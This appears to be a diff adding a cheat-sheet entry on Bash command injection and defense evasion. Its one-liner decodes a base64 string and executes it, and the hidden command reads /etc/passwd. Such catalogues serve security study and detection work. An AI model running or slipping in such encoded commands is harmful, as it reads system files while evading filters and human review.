@@ -1,0 +1,6 @@
+# bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+
+OS: Linux
+Description: Execute Base64 string
+Security Domains: Command Injection (https://www.notion.so/Command-Injection-1434c8e52376803c8c3edfbca59dcd49?pvs=21), Defense Evasion (https://www.notion.so/Defense-Evasion-1444c8e5237680b0b1e4e1911aa265ff?pvs=21)
+Target_Technology: Bash (https://www.notion.so/Bash-1434c8e5237680b5aa14d2174d201e9a?pvs=21)
